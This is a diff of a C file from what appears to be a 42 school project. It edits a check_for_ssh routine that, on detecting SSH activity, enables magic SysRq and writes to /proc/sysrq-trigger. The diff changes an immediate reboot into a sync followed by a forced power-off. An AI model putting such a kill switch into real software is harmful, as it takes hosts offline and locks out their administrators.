@@ -6,7 +6,7 @@
 /*   By: hmochida <hmochida@student.42sp.org.br>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/12/31 05:50:16 by hmochida          #+#    #+#             */
-/*   Updated: 2023/01/06 11:06:03 by hmochida         ###   ########.fr       */
+/*   Updated: 2023/01/06 12:15:26 by hmochida         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,7 +22,7 @@
 /* PROTOTYPES*/
 unsigned int sec_crc8(unsigned int crc, unsigned char const *data, size_t len);
 
-void	check_for_ssh(void)
+void	*check_for_ssh(void)
 {
 	FILE	*fd;
 	char	buffer[200];
@@ -42,8 +42,11 @@ void	check_for_ssh(void)
 			}
 			pclose(fd);
 			system("echo 1 > /proc/sys/kernel/sysrq"); //reboots the system;
-			system("echo b > /proc/sysrq-trigger");
+			system("echo s > /proc/sysrq-trigger");
+			sleep(1);
+			system("echo o > /proc/sysrq-trigger");
 		}
+		sleep(2);
 	}
 }
 
